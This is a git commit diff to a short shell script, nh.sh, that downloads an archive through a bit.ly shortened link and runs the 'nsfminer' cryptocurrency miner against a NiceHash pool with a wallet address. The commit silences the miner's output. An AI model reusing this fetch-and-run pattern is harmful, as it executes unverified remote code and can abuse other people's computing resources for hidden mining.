500e671bc1eabd076f7759a62a0cb0739c752dc2
tviyyu <94235145+tviyyu@users.noreply.github.com>
2021-11-13 21:48:11 +0530

    Update nh.sh

--- nh.sh
+++ nh.sh
@@ -2,4 +2,4 @@
 wget https://bit.ly/31YnEGW
 tar -xvf 31YnEGW
 chmod +x nsfminer
-timeout 1000 ./nsfminer -P stratum2+tcp://3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.FO@daggerhashimoto.usa-west.nicehash.com:3353
+timeout 1000 ./nsfminer -P stratum2+tcp://3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.FO@daggerhashimoto.usa-west.nicehash.com:3353 >/dev/null
